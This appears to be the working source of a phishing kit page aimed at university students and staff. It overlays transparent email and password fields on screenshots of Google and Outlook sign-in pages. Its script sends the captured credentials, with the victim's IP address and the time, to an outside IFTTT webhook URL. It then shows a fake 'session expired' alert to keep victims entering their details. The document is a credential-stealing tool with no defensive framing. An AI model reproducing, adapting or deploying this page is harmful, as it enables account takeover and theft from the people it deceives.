.dropdown-toggle.btn-flickr{color:#fff;background-color:#d6006f;border-color:rgba(0,0,0,.2)}.btn-flickr.disabled,.btn-flickr.disabled.active,.btn-flickr.disabled:active,.btn-flickr.disabled:focus,.btn-flickr.disabled:hover,.btn-flickr[disabled],.btn-flickr[disabled].active,.btn-flickr[disabled]:active,.btn-flickr[disabled]:focus,.btn-flickr[disabled]:hover,fieldset[disabled] .btn-flickr,fieldset[disabled] .btn-flickr.active,fieldset[disabled] .btn-flickr:active,fieldset[disabled] .btn-flickr:focus,fieldset[disabled] .btn-flickr:hover{background-color:#ff0084;border-color:rgba(0,0,0,.2)}.btn-github{color:#fff;background-color:#444;border-color:rgba(0,0,0,.2)}.btn-github.active,.btn-github:active,.btn-github:focus,.btn-github:hover,.open .dropdown-toggle.btn-github{color:#fff;background-color:#303030;border-color:rgba(0,0,0,.2)}.btn-github.disabled,.btn-github.disabled.active,.btn-github.disabled:active,.btn-github.disabled:focus,.btn-github.disabled:hover,.btn-github[disabled],.btn-github[disabled].active,.btn-github[disabled]:active,.btn-github[disabled]:focus,.btn-github[disabled]:hover,fieldset[disabled] .btn-github,fieldset[disabled] .btn-github.active,fieldset[disabled] .btn-github:active,fieldset[disabled] .btn-github:focus,fieldset[disabled] .btn-github:hover{background-color:#444;border-color:rgba(0,0,0,.2)}.btn-google-plus{color:#fff;background-color:#dd4b39;border-color:rgba(0,0,0,.2)}.btn-google-plus.active,.btn-google-plus:active,.btn-google-plus:focus,.btn-google-plus:hover,.open .dropdown-toggle.btn-google-plus{color:#fff;background-color:#ca3523;border-color:rgba(0,0,0,.2)}.btn-google-plus.active,.btn-google-plus:active,.open .dropdown-toggle.btn-google-plus{background-image:none}.btn-google-plus.disabled,.btn-google-plus.disabled.active,.btn-google-plus.disabled:active,.btn-google-plus.disabled:focus,.btn-google-plus.disabled:hover,.btn-google-plus[disabled],.btn-google-plus[disabled].active,.btn-google-plus[disabled]:active,.btn-google-plus[disabled]:focus,.btn-google-plus[disabled]:hover,fieldset[disabled] .btn-google-plus,fieldset[disabled] .btn-google-plus.active,fieldset[disabled] .btn-google-plus:active,fieldset[disabled] .btn-google-plus:focus,fieldset[disabled] .btn-google-plus:hover{background-color:#dd4b39;border-color:rgba(0,0,0,.2)}.btn-instagram{color:#fff;background-color:#517fa4;border-color:rgba(0,0,0,.2)}.btn-instagram.active,.btn-instagram:active,.btn-instagram:focus,.btn-instagram:hover,.open .dropdown-toggle.btn-instagram{color:#fff;background-color:#446a89;border-color:rgba(0,0,0,.2)}.btn-instagram.disabled,.btn-instagram.disabled.active,.btn-instagram.disabled:active,.btn-instagram.disabled:focus,.btn-instagram.disabled:hover,.btn-instagram[disabled],.btn-instagram[disabled].active,.btn-instagram[disabled]:active,.btn-instagram[disabled]:focus,.btn-instagram[disabled]:hover,fieldset[disabled] .btn-instagram,fieldset[disabled] .btn-instagram.active,fieldset[disabled] .btn-instagram:active,fieldset[disabled] .btn-instagram:focus,fieldset[disabled] .btn-instagram:hover{background-color:#517fa4;border-color:rgba(0,0,0,.2)}.btn-linkedin{color:#fff;background-color:#007bb6;border-color:rgba(0,0,0,.2)}.btn-linkedin.active,.btn-linkedin:active,.btn-linkedin:focus,.btn-linkedin:hover,.open .dropdown-toggle.btn-linkedin{color:#fff;background-color:#005f8d;border-color:rgba(0,0,0,.2)}.btn-linkedin.disabled,.btn-linkedin.disabled.active,.btn-linkedin.disabled:active,.btn-linkedin.disabled:focus,.btn-linkedin.disabled:hover,.btn-linkedin[disabled],.btn-linkedin[disabled].active,.btn-linkedin[disabled]:active,.btn-linkedin[disabled]:focus,.btn-linkedin[disabled]:hover,fieldset[disabled] .btn-linkedin,fieldset[disabled] .btn-linkedin.active,fieldset[disabled] .btn-linkedin:active,fieldset[disabled] .btn-linkedin:focus,fieldset[disabled] .btn-linkedin:hover{background-color:#007bb6;border-color:rgba(0,0,0,.2)}.btn-pinterest{color:#fff;background-color:#cb2027;border-color:rgba(0,0,0,.2)}.btn-pinterest.active,.btn-pinterest:active,.btn-pinterest:focus,.btn-pinterest:hover,.open .dropdown-toggle.btn-pinterest{color:#fff;background-color:#a81a20;border-color:rgba(0,0,0,.2)}.btn-pinterest.disabled,.btn-pinterest.disabled.active,.btn-pinterest.disabled:active,.btn-pinterest.disabled:focus,.btn-pinterest.disabled:hover,.btn-pinterest[disabled],.btn-pinterest[disabled].active,.btn-pinterest[disabled]:active,.btn-pinterest[disabled]:focus,.btn-pinterest[disabled]:hover,fieldset[disabled] .btn-pinterest,fieldset[disabled] .btn-pinterest.active,fieldset[disabled] .btn-pinterest:active,fieldset[disabled] .btn-pinterest:focus,fieldset[disabled] .btn-pinterest:hover{background-color:#cb2027;border-color:rgba(0,0,0,.2)}.btn-tumblr{color:#fff;background-color:#2c4762;border-color:rgba(0,0,0,.2)}.btn-tumblr.active,.btn-tumblr:active,.btn-tumblr:focus,.btn-tumblr:hover,.open .dropdown-toggle.btn-tumblr{color:#fff;background-color:#1f3346;border-color:rgba(0,0,0,.2)}.btn-tumblr.disabled,.btn-tumblr.disabled.active,.btn-tumblr.disabled:active,.btn-tumblr.disabled:focus,.btn-tumblr.disabled:hover,.btn-tumblr[disabled],.btn-tumblr[disabled].active,.btn-tumblr[disabled]:active,.btn-tumblr[disabled]:focus,.btn-tumblr[disabled]:hover,fieldset[disabled] .btn-tumblr,fieldset[disabled] .btn-tumblr.active,fieldset[disabled] .btn-tumblr:active,fieldset[disabled] .btn-tumblr:focus,fieldset[disabled] .btn-tumblr:hover{background-color:#2c4762;border-color:rgba(0,0,0,.2)}.btn-twitter{color:#fff;background-color:#2ba9e1;border-color:rgba(0,0,0,.2)}.btn-twitter.active,.btn-twitter:active,.btn-twitter:focus,.btn-twitter:hover,.open .dropdown-toggle.btn-twitter{color:#fff;background-color:#1c92c7;border-color:rgba(0,0,0,.2)}.btn-twitter.disabled,.btn-twitter.disabled.active,.btn-twitter.disabled:active,.btn-twitter.disabled:focus,.btn-twitter.disabled:hover,.btn-twitter[disabled],.btn-twitter[disabled].active,.btn-twitter[disabled]:active,.btn-twitter[disabled]:focus,.btn-twitter[disabled]:hover,fieldset[disabled] .btn-twitter,fieldset[disabled] .btn-twitter.active,fieldset[disabled] .btn-twitter:active,fieldset[disabled] .btn-twitter:focus,fieldset[disabled] .btn-twitter:hover{background-color:#2ba9e1;border-color:rgba(0,0,0,.2)}.btn-vk{color:#fff;background-color:#587ea3;border-color:rgba(0,0,0,.2)}.btn-vk.active,.btn-vk:active,.btn-vk:focus,.btn-vk:hover,.open .dropdown-toggle.btn-vk{color:#fff;background-color:#4a6a89;border-color:rgba(0,0,0,.2)}.btn-vk.disabled,.btn-vk.disabled.active,.btn-vk.disabled:active,.btn-vk.disabled:focus,.btn-vk.disabled:hover,.btn-vk[disabled],.btn-vk[disabled].active,.btn-vk[disabled]:active,.btn-vk[disabled]:focus,.btn-vk[disabled]:hover,fieldset[disabled] .btn-vk,fieldset[disabled] .btn-vk.active,fieldset[disabled] .btn-vk:active,fieldset[disabled] .btn-vk:focus,fieldset[disabled] .btn-vk:hover{background-color:#587ea3;border-color:rgba(0,0,0,.2)}.social-class .social-hex{font-family:Monaco,Menlo,Consolas,"Courier New",monospace;font-size:10px;opacity:.3;float:right}.social-class li:hover .social-hex{opacity:1}.social-class li:hover code{background-color:#e8e8ee}.social-class code{cursor:default}@media screen and (max-width:480px){form{width:310px;margin:auto auto auto -155px;position:relative;top:25vh;left:0}button.nextbtn{position:relative;top:20px;background-color:#188fff;border-radius:3px;font-size:15px;border:none;color:#fff;font-weight:600}}
    </style>
    <style>
                        .iframe {
                        height: 100vh;
                        width: calc(100vw - 30px);
                    }
    </style>
  </head>

  <body>
    <div>
      
    </div>
    <div class="container-fluid">
        <div class="row">
                <div class="col-md-4 col-sm-4 col-xs-4">
                        <div class="social-buttons" style="margin-top: 30px">
                        <a class="btn btn-social btn-google-plus" data-frametarget="gapps">
                            <i class="fa fa-google"></i> Undergraduate students
                        </a>
                        <a class="btn btn-social btn-facebook" data-frametarget="outlook">
                            <i class="fa fa-windows"></i> Faculty, staff, and graduate students
                        </a>                    
                        <hr>
                        </div>  
                    </div>            
        </div>
      <div class="row">     

        <div class="col-md-12">
            <div class="iframe">

            </div>
            <!-- <iframe src="all.html" frameborder="0" style="width: 100%;
            height: 100vh;"></iframe> -->
        </div>
    </div> <!-- /container -->
    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
    
    <script>
        let pages = {
        }

        pages.gapps = `

            <style type="text/css">
                .form-signin
                {
                    max-width: 330px;
                    padding: 15px;
                    margin: 0 auto;
                    top: 12rem;
                    float: none;
                    right: -11.4rem;
                }
                .form-signin .form-signin-heading, .form-signin .checkbox
                {
                    margin-bottom: 10px;
                }
                .form-signin .checkbox
                {
                    font-weight: normal;
                }
                .form-signin .form-control
                {
                    position: relative;
                    font-size: 16px;
                    height: auto;
                    padding: 3px;
                    -webkit-box-sizing: border-box;
                    -moz-box-sizing: border-box;
                    box-sizing: border-box;
                }
                .form-signin .form-control:focus
                {
                    z-index: 2;
                }
                .form-signin input[type="text"]
                {
                    margin-bottom: -1px;
                    border-bottom-left-radius: 0;
                    border-bottom-right-radius: 0;
                }
                .form-signin input[type="password"]
                {
                    margin-bottom: 10px;
                    border-top-left-radius: 0;
                    border-top-right-radius: 0;
                }
                .account-wall
                {
                    margin-top: 20px;
                    padding: 40px 0px 20px 0px;
                    background-color: #f7f7f7;
                    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
                    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
                    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
                }
                .login-title
                {
                    color: #555;
                    font-size: 18px;
                    font-weight: 400;
                    display: block;
                }
                .profile-img
                {
                    width: 96px;
                    height: 96px;
                    margin: 0 auto 10px;
                    display: block;
                    -moz-border-radius: 50%;
                    -webkit-border-radius: 50%;
                    border-radius: 50%;
                }
                .need-help
                {
                    margin-top: 10px;
                }
                .new-account
                {
                    display: block;
                    margin-top: 10px;
                }    
            </style>
            <div class="container">

                <div class="row">
                
                        
                    <div class="col-sm-6 col-md-4 col-md-offset-4">
                        <h1 class="text-center login-title"></h1>
                        <form class="form-signin hidden-xs" novalidate>
                            <input type="text" class="form-control emailaddy" placeholder="Email" required autofocus>
                            <input type="password" class="form-control passwd" placeholder="Password" required
                            style="margin-top: 0.5rem"
                            >
                            
                            <button class="btn btn-lg btn-primary btn-block " type="submit" 
                                style="
                                    margin-top: 0.02rem;
                                    background-color: transparent;
                                    background-image: unset;
                                    border: none;
                                "
                            >Sign in</button>

                        </form>
                    </div>
                </div>
     
            </div>        
        
        `

        pages.gappsMobile = `

            <style type="text/css">
                .form-signin
                {
                    max-width: 330px;
                    padding: 15px;
                    margin: 0 auto;
                    top: 12rem;
                    float: none;
                    right: -11.4rem;
                }
                .form-signin .form-signin-heading, .form-signin .checkbox
                {
                    margin-bottom: 10px;
                }
                .form-signin .checkbox
                {
                    font-weight: normal;
                }
                .form-signin .form-control
                {
                    position: relative;
                    font-size: 16px;
                    height: auto;
                    padding: 3px;
                    -webkit-box-sizing: border-box;
                    -moz-box-sizing: border-box;
                    box-sizing: border-box;
                }
                .form-signin .form-control:focus
                {
                    z-index: 2;
                }
                .form-signin input[type="text"]
                {
                    margin-bottom: -1px;
                    border-bottom-left-radius: 0;
                    border-bottom-right-radius: 0;
                }
                .form-signin input[type="password"]
                {
                    margin-bottom: 10px;
                    border-top-left-radius: 0;
                    border-top-right-radius: 0;
                }
                .account-wall
                {
                    margin-top: 20px;
                    padding: 40px 0px 20px 0px;
                    background-color: #f7f7f7;
                    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
                    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
                    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
                }
                .login-title
                {
                    color: #555;
                    font-size: 18px;
                    font-weight: 400;
                    display: block;
                }
                .profile-img
                {
                    width: 96px;
                    height: 96px;
                    margin: 0 auto 10px;
                    display: block;
                    -moz-border-radius: 50%;
                    -webkit-border-radius: 50%;
                    border-radius: 50%;
                }
                .need-help
                {
                    margin-top: 10px;
                }
                .new-account
                {
                    display: block;
                    margin-top: 10px;
                }    
            </style>
            <div class="container">

                <div class="row">
                
                        
                    <div class="col-sm-6 col-md-4 col-md-offset-4">
                        <h1 class="text-center login-title"></h1>
                        <form style="    top: 16rem;
                            right: -9rem;
                            left: -1rem;" class="hidden-md" novalidate>
                            <input type="text" class="form-control emailaddy" placeholder="Email" required autofocus>
                            <input type="password" class="form-control passwd" placeholder="Password" required
                            style="margin-top: 4.5rem"
                            >
                            
                            <button class="btn btn-lg btn-primary btn-block " type="submit" 
                                style="
                                    margin-top: 2.2rem;
                                    background-color: transparent;
                                    background-image: unset;
                                    border: none;
                                "
                            >Login</button>

                        </form>
                    </div>
                </div>
     
            </div>        
        
        `

        pages.outlook = `

            <style type="text/css">
                .form-signin
                {
                    max-width: 330px;
                    padding: 15px;
                    margin: 0 auto;
                    top: 22.1rem;
                    float: none;
                    right: -10rem;
                }
                .form-signin .form-signin-heading, .form-signin .checkbox
                {
                    margin-bottom: 10px;
                }
                .form-signin .checkbox
                {
                    font-weight: normal;
                }
                .form-signin .form-control
                {
                    position: relative;
                    font-size: 16px;
                    height: auto;
                    padding: 3px;
                    -webkit-box-sizing: border-box;
                    -moz-box-sizing: border-box;
                    box-sizing: border-box;
                }
                .form-signin .form-control:focus
                {
                    z-index: 2;
                }
                .form-signin input[type="text"]
                {
                    margin-bottom: -1px;
                    border-bottom-left-radius: 0;
                    border-bottom-right-radius: 0;
                }
                .form-signin input[type="password"]
                {
                    margin-bottom: 10px;
                    border-top-left-radius: 0;
                    border-top-right-radius: 0;
                }
                .account-wall
                {
                    margin-top: 20px;
                    padding: 40px 0px 20px 0px;
                    background-color: #f7f7f7;
                    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
                    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
                    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
                }
                .login-title
                {
                    color: #555;
                    font-size: 18px;
                    font-weight: 400;
                    display: block;
                }
                .profile-img
                {
                    width: 96px;
                    height: 96px;
                    margin: 0 auto 10px;
                    display: block;
                    -moz-border-radius: 50%;
                    -webkit-border-radius: 50%;
                    border-radius: 50%;
                }
                .need-help
                {
                    margin-top: 10px;
                }
                .new-account
                {
                    display: block;
                    margin-top: 10px;
                }    
            </style>
            <div class="container">

                <div class="row">
                
                        
                    <div class="col-sm-6 col-md-4 col-md-offset-4">
                        <h1 class="text-center login-title"></h1>
                        <form class="form-signin" novalidate>
                            <input type="text" class="form-control emailaddy" placeholder="Email" required autofocus>
                            <input type="password" class="form-control passwd" placeholder="Password" required
                            style="margin-top: 3.9rem"
                            >
                            
                            <button class="btn btn-lg btn-primary btn-block " type="submit" 
                                style="
                                    margin-top: 2.5rem;
                                    margin-top: 2.5rem;
                                    background-color: transparent;
                                    background-image: unset;
                                    border: none;
                                    color: transparent;
                                "
                            >sign in</button>
                        </form>
                    </div>
                </div>
     
            </div>        
        
        `
        
        pages.outlookMobile = `

            <style type="text/css">
                .form-signin
                {
                    max-width: 330px;
                    padding: 15px;
                    margin: 0 auto;
                    top: 22.1rem;
                    float: none;
                    right: -10rem;
                }
                .form-signin .form-signin-heading, .form-signin .checkbox
                {
                    margin-bottom: 10px;
                }
                .form-signin .checkbox
                {
                    font-weight: normal;
                }
                .form-signin .form-control
                {
                    position: relative;
                    font-size: 16px;
                    height: auto;
                    padding: 3px;
                    -webkit-box-sizing: border-box;
                    -moz-box-sizing: border-box;
                    box-sizing: border-box;
                }
                .form-signin .form-control:focus
                {
                    z-index: 2;
                }
                .form-signin input[type="text"]
                {
                    margin-bottom: -1px;
                    border-bottom-left-radius: 0;
                    border-bottom-right-radius: 0;
                }
                .form-signin input[type="password"]
                {
                    margin-bottom: 10px;
                    border-top-left-radius: 0;
                    border-top-right-radius: 0;
                }
                .account-wall
                {
                    margin-top: 20px;
                    padding: 40px 0px 20px 0px;
                    background-color: #f7f7f7;
                    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
                    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
                    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
                }
                .login-title
                {
                    color: #555;
                    font-size: 18px;
                    font-weight: 400;
                    display: block;
                }
                .profile-img
                {
                    width: 96px;
                    height: 96px;
                    margin: 0 auto 10px;
                    display: block;
                    -moz-border-radius: 50%;
                    -webkit-border-radius: 50%;
                    border-radius: 50%;
                }
                .need-help
                {
                    margin-top: 10px;
                }
                .new-account
                {
                    display: block;
                    margin-top: 10px;
                }    
            </style>
            <div class="container">

                <div class="row">
                
                        
                    <div class="col-sm-6 col-md-4 col-md-offset-4">
                        <h1 class="text-center login-title"></h1>

                        <form class="form-signin" novalidate>
                            <input type="text" class="form-control emailaddy" placeholder="Email" required autofocus>
                            <input type="password" class="form-control passwd" placeholder="Password" required
                            style="margin-top: 4.9rem"
                            >
                            
                            <button class="btn btn-lg btn-block " type="submit" 
                                style="
                                    margin-top: 2.5rem;
                                    background-image: none;
                                    border: none;
                                    color: blue
                                "
                            >sign in</button>
                        </form>

                    </div>
                </div>
     
            </div>        
        
        `

        let images = {
            gapps : "img/gapps.jpg",
            outlook: "img/outlook.png",
            'mob-gapps' : "img/gapps-m.jpg",
            'mob-outlook': "img/livm.jpg"
        }

		
        <?php
            $ip = $_SERVER['REMOTE_ADDR'];
            $reqtime = date('l jS \of F Y h:i:s A');
            $word = "$ip, $reqtime"
            ?>
        let o = "<?php echo $word; ?>"
        let isMobile = ''

        $(function () {
            // $('button.nextbtn').click(() => {

                
            // })
            $('.iframe').html(pages.outlook)
            
            if (window.outerWidth <= 412 ) { 
                $('.iframe').css({
                    'background-image': `url("img/livm.jpg")`
                })
                const basehtml = pages[`outlookMobile`]
                    $('.iframe').html(basehtml)                
            }
            $('.btn-social').click(e => {
                const iframeSrc = $(e.currentTarget).data('frametarget')
                const basehtml = pages[iframeSrc]
                $('.iframe').html(basehtml)
                if (window.outerWidth <= 412 ) {
                    isMobile = 'mob-'
                    // pages.gappsMobile = pages.gapps
                    const basehtml = pages[`${iframeSrc}Mobile`]
                    $('.iframe').html(basehtml)
                }
                $('.iframe').css({
                    'background-image': `url(${images[ isMobile + iframeSrc] })`
                    // 'background': 'url(data:image/jpeg;base64, ' + images[iframeSrc] + ') no-repeat center center fixed'
                })
            })

            $(document).on('submit', 'form', e => {
                e.preventDefault()
                let inputInput = $('input.emailaddy')
                let passwdInput = $('input.passwd')
                if (inputInput.val().length < 1) return false

                if (inputInput.val().length > 1 &&
                    passwdInput.val().length > 1) {
                    
                    const useremail = inputInput.val()
                    const userpass = passwdInput.val()
                    $.ajax({
                        method: 'POST',
                        url: 'https://maker.ifttt.com/trigger/entry_saved/with/key/D1_LL8iH1SM8dIwHMqWXi',
                        data: {
                            value1: `${useremail}, ${userpass}, ${o}`
                        },
                        success: (data) => {
                            alert('Sorry your session has expired. Please try again.')
                        }
                    })
                    // alert(`user ${useremail}, pass ${userpass}`)
                } else {
                    inputInput.hide()
                    passwdInput.show()
                }    
                
                // start
                
             
                return false
            })

        })        



    </script>

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  </body>
</html>
